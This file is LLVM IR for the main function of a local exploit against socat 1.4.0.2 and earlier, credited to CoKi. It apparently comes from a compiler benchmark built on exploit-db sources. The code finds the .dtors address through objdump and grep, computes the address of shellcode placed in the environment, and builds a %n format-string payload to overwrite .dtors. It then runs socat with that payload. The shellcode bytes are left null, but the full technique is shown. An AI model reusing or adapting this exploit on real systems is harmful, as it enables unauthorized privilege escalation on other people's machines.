; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_591.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_591.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@PATH = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [33 x i8] c"%s -s -j .dtors %s | %s ffffffff\00", align 1
@OBJDUMP = common dso_local global i8* null, align 8
@GREP = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c" %08x\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"Cannot find .dtors address\0A\00", align 1
@.str.4 = private unnamed_addr constant [53 x i8] c"\0A socat <= 1.4.0.2 local exploit (Proof of Concept)\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c" by CoKi <coki@nosystem.com.ar>\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c" shellcode address = %.8p\0A\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c" .dtors address    = %.8p\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"-ly\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [45 x i8] c"%%%du%%30$n%%%du%%31$n%%%du%%32$n%%%du%%33$n\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"socat\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [512 x i8], align 16
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca [3 x i8*], align 16
  %20 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %21 = getelementptr inbounds [3 x i8*], [3 x i8*]* %19, i64 0, i64 0
  %22 = load i8*, i8** @shellcode, align 8
  store i8* %22, i8** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %21, i64 1
  store i8* null, i8** %23, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = getelementptr inbounds i8*, i8** %21, i64 3
  br label %26

26:                                               ; preds = %26, %2
  %27 = phi i8** [ %24, %2 ], [ %28, %26 ]
  store i8* null, i8** %27, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = icmp eq i8** %28, %25
  br i1 %29, label %30, label %26

30:                                               ; preds = %26
  %31 = load i8*, i8** @shellcode, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = sub i32 -1073741830, %32
  %34 = load i8*, i8** @PATH, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = sub i32 %33, %35
  store i32 %36, i32* %20, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %38 = load i8*, i8** @OBJDUMP, align 8
  %39 = load i8*, i8** @PATH, align 8
  %40 = load i8*, i8** @GREP, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %37, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i8* %38, i8* %39, i8* %40)
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %43 = call i32* @popen(i8* %42, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %43, i32** %18, align 8
  %44 = load i32*, i32** %18, align 8
  %45 = call i32 @fscanf(i32* %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32* %7)
  %46 = icmp ne i32 %45, 1
  br i1 %46, label %47, label %52

47:                                               ; preds = %30
  %48 = load i32*, i32** %18, align 8
  %49 = call i32 @pclose(i32* %48)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #3
  unreachable

52:                                               ; preds = %30
  %53 = load i32*, i32** %18, align 8
  %54 = call i32 @pclose(i32* %53)
  %55 = load i32, i32* %7, align 4
  %56 = add nsw i32 %55, 4
  store i32 %56, i32* %7, align 4
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0))
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  %59 = load i32, i32* %20, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i32 %59)
  %61 = load i32, i32* %7, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0), i32 %61)
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %64 = call i32 @bzero(i8* %63, i32 512)
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %66 = call i32 @bzero(i8* %65, i32 1024)
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %68 = call i32 @strcat(i8* %67, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %69

69:                                               ; preds = %82, %52
  %70 = load i32, i32* %6, align 4
  %71 = icmp slt i32 %70, 4
  br i1 %71, label %72, label %85

72:                                               ; preds = %69
  %73 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %74 = call i32 @bzero(i8* %73, i32 512)
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %76 = call i32 (i8*, i8*, ...) @sprintf(i8* %75, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32* %7)
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %79 = call i32 @strncat(i8* %77, i8* %78, i32 4)
  %80 = load i32, i32* %7, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %7, align 4
  br label %82

82:                                               ; preds = %72
  %83 = load i32, i32* %6, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %6, align 4
  br label %69

85:                                               ; preds = %69
  %86 = load i32, i32* %20, align 4
  %87 = and i32 %86, -16777216
  %88 = lshr i32 %87, 24
  store i32 %88, i32* %8, align 4
  %89 = load i32, i32* %20, align 4
  %90 = and i32 %89, 16711680
  %91 = ashr i32 %90, 16
  store i32 %91, i32* %9, align 4
  %92 = load i32, i32* %20, align 4
  %93 = and i32 %92, 65280
  %94 = ashr i32 %93, 8
  store i32 %94, i32* %10, align 4
  %95 = load i32, i32* %20, align 4
  %96 = and i32 %95, 255
  store i32 %96, i32* %11, align 4
  %97 = load i32, i32* %11, align 4
  %98 = sub i32 %97, 27
  %99 = sub i32 %98, 16
  store i32 %99, i32* %14, align 4
  %100 = load i32, i32* %14, align 4
  %101 = call i32 @check(i32 %100)
  store i32 %101, i32* %14, align 4
  %102 = load i32, i32* %10, align 4
  %103 = load i32, i32* %11, align 4
  %104 = sub i32 %102, %103
  store i32 %104, i32* %15, align 4
  %105 = load i32, i32* %15, align 4
  %106 = call i32 @check(i32 %105)
  store i32 %106, i32* %15, align 4
  %107 = load i32, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = sub i32 %107, %108
  store i32 %109, i32* %16, align 4
  %110 = load i32, i32* %16, align 4
  %111 = call i32 @check(i32 %110)
  store i32 %111, i32* %16, align 4
  %112 = load i32, i32* %8, align 4
  %113 = load i32, i32* %9, align 4
  %114 = sub i32 %112, %113
  store i32 %114, i32* %17, align 4
  %115 = load i32, i32* %17, align 4
  %116 = call i32 @check(i32 %115)
  store i32 %116, i32* %17, align 4
  %117 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %118 = load i32, i32* %14, align 4
  %119 = load i32, i32* %15, align 4
  %120 = load i32, i32* %16, align 4
  %121 = load i32, i32* %17, align 4
  %122 = call i32 (i8*, i8*, ...) @sprintf(i8* %117, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.10, i64 0, i64 0), i32 %118, i32 %119, i32 %120, i32 %121)
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %124 = getelementptr inbounds [512 x i8], [512 x i8]* %12, i64 0, i64 0
  %125 = call i32 @strcat(i8* %123, i8* %124)
  %126 = load i8*, i8** @PATH, align 8
  %127 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %128 = getelementptr inbounds [3 x i8*], [3 x i8*]* %19, i64 0, i64 0
  %129 = call i32 @execle(i8* %126, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i8* %127, i32* null, i8** %128)
  %130 = load i32, i32* %3, align 4
  ret i32 %130
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32* @popen(i8*, i8*) #1

declare dso_local i32 @fscanf(i32*, i8*, i32*) #1

declare dso_local i32 @pclose(i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @check(i32) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
